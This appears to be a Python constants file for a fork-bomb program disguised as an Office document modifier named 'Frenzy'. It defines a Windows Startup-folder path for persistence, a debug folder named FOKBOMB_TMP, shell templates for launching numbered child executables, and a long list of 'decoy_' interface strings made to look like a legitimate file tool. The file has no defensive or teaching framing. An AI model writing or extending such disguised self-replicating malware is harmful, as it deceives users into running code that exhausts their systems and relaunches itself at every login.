WIN_STARTUP_FOLDER_FORMATTER = (
    "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)
WIN_DEBUG_STARTUP_FOLDER_FORMATTER = "C:\\Users\\%s\\Downloads\\FOKBOMB_TMP"
WIN_EXEC_FORMATTER = "cmd.exe /C start \"%s\" %s"
WIN_CHILD_NAME_FORMATTER = "%d.exe"

LIN_EXEC_FORMATTER = "sh -c '%s' %s &"
UNLOCK_CHILD = "\t\t"
ENABLE_DEBUG = "::"

decoy_WELCOME_MESSAGE = "Hello, World!"
decoy_UI_APP_NAME = "Frenzy - Office 360 file modifier"
decoy_MESSAGE_INVALID_PLATE = "Please enter a valid plate number, or press 'Exit'"
decoy_UI_BUTTON_TEXT_EXIT = "Exit"
decoy_UI_LABEL_TEXT_LOADING = "Loading..."
decoy_UI_LABEL_DOWNLOAD_STATUS = "%s / %d"
decoy_UI_ERR_INVALID_TYPE = "The only allowed file types are: PDF, DOCX, DOCM, DOTX, XLSX, XLSM, SLTX, PPTX, PPTM, PPSX, or ODT. %s is not allowed."
decoy_UI_ERR_UI_BUFFER_CORRUPT = (
    "CRITICAL: UiFormatBuffer overflow. Allocation of %d bytes failed."
)
decoy_UI_WINDOW_TITLE_PREFS = "Frenzy Configuration Settings"
decoy_UI_TAB_GENERAL = "General"
decoy_UI_TAB_ADVANCED = "Advanced Logic"
decoy_UI_CHECKBOX_BACKUP = "Create .bak files before modification"
decoy_UI_TOOLTIP_RESTORE = "Restores original file attributes from internal cache"
decoy_UI_PROGRESS_FINALIZING = "Finalizing file integrity checks..."
decoy_ERR_FILE_LOCKED = "Error: File is currently open in another application."
decoy_ERR_DISK_FULL = "Operation failed: Insufficient disk space on target drive."
decoy_ERR_UNSUPPORTED_VER = (
    "The selected document version is too old for this modifier."
)
decoy_ERR_MIME_MISMATCH = (
    "MIME type mismatch: Header does not match expected file signature."
)
decoy_ERR_TEMP_FAILURE = (
    "Could not create temporary working directory in AppData/Local."
)
decoy_NET_CHECKING_UPDATES = "Checking for Frenzy updates..."
decoy_NET_PROXY_AUTH = (
    "Proxy authentication required: please check your system settings."
)
decoy_NET_TELEMETRY_OPT_OUT = "Telemetry reporting is disabled by user policy."
decoy_NET_API_SYNC_SUCCESS = "Metadata synchronization complete. (0x%d)"
decoy_OFFICE_MACRO_STRIP = "Removing embedded VBA macros from source document..."
decoy_OFFICE_METADATA_CLEAN = "Clearing author metadata and revision history..."
decoy_OFFICE_RECOVERY_MODE = "Running in Document Recovery mode (No GUI)."
decoy_OFFICE_XML_PARSER_ERR = "XML Parser Error: Unexpected token at line %d, col %d."
